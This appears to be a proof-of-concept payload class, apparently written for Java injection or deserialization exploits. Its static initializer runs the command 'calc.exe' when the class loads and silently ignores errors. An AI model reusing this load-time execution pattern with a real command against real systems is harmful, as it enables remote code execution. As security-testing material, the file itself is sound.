public class Evil {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception ee) {

        }
    }

    public static void main (String[] args) throws Exception {

    }
}
